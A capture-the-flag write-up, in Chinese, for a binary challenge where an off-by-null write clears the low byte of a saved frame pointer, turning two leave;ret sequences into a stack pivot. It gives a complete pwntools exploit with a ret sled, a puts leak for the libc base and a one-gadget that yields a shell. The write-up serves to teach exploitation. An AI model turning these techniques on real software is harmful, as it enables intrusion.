# 没了溢出，你能秒我？

## 题目简述

二进制开启 NX、关闭 PIE 且没有 Canary。`vuln()` 的缓冲区正好是 `0x100` 字节，看似没有常规栈溢出，但自制输入函数在读满时会额外写入一个 `\x00`，恰好清零 `vuln` 保存的 `rbp` 最低字节。经过 `vuln` 和 `main` 两次 `leave; ret` 后，栈顶会被抬到当前栈页内较低的攻击者数据处，从而执行预先布置的 ROP 链。

## 解题过程

漏洞位于读满分支：

```c
int custom_gets_off_by_one_or_null(char *buf, int cnt) {
    for (int i = 0; i < cnt; i++) {
        read(0, buf + i, 1);
        if (buf[i] == '\n') {
            buf[i] = '\x00';
            return i;
        }
    }
    buf[cnt] = '\x00';
}
```

`buf` 的长度与 `cnt` 都是 `0x100`，所以 `buf[0x100]` 覆盖保存的 `rbp`。必须发送恰好 `0x100` 字节且其中不带换行，才能进入该分支。

第一次 `leave; ret` 仍正常返回 `main`，但弹出的 `rbp` 已被改为原值按 `0x100` 向下对齐后的地址。`main` 返回时再次执行 `leave; ret`，此时 `rsp` 被设为该伪造 `rbp`。由于落点可能位于 `0x100` 字节输入区的不同位置，可在有效 ROP 链前铺满 `ret` gadget，形成 ret sled；只要落进滑道，就会一路执行到末尾链条。

第一阶段泄露 `puts`，返回 `main` 再触发一次；第二阶段使用随题 libc 中偏移 `0xe3afe` 的 one-gadget。`0x40138c` 会依次弹出 `r12` 到 `r15`，将这些寄存器置零以满足该 gadget 的约束。

```python
import sys
from pwn import ELF, context, flat, p64, process, remote, u64

context(arch="amd64", os="linux")

elf = ELF("./poison-rbp", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(elf.path)

pop_rdi = 0x401393
ret = 0x401394
pop_r12_r15 = 0x40138C
one_gadget_offset = 0xE3AFE

def with_ret_sled(chain):
    assert len(chain) <= 0x100 and len(chain) % 8 == 0
    return p64(ret) * ((0x100 - len(chain)) // 8) + chain

# Stage 1：泄露 puts 并返回 main。
leak_chain = flat(
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
io.sendafter(b"Try perform ROP!\n", with_ret_sled(leak_chain))
io.recvuntil(b"Good luck!\n")
leaked_puts = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym["puts"]

# Stage 2：清零 one-gadget 约束寄存器后跳转。
shell_chain = flat(
    pop_r12_r15,
    0,
    0,
    0,
    0,
    libc.address + one_gadget_offset,
)
io.sendafter(b"Try perform ROP!\n", with_ret_sled(shell_chain))
io.interactive()
```

`one_gadget_offset` 与 libc 版本绑定；如果更换附件，必须重新计算，不能照抄偏移。

## 方法总结

本题展示了 off-by-null 对保存帧指针的利用：即使返回地址没有被直接覆盖，两级函数栈帧也能把被污染的 `rbp` 转成栈迁移原语。关键验收点是输入必须正好读满、清零后的地址确实落入可控区，以及 ret sled 最终能命中 ROP 链。
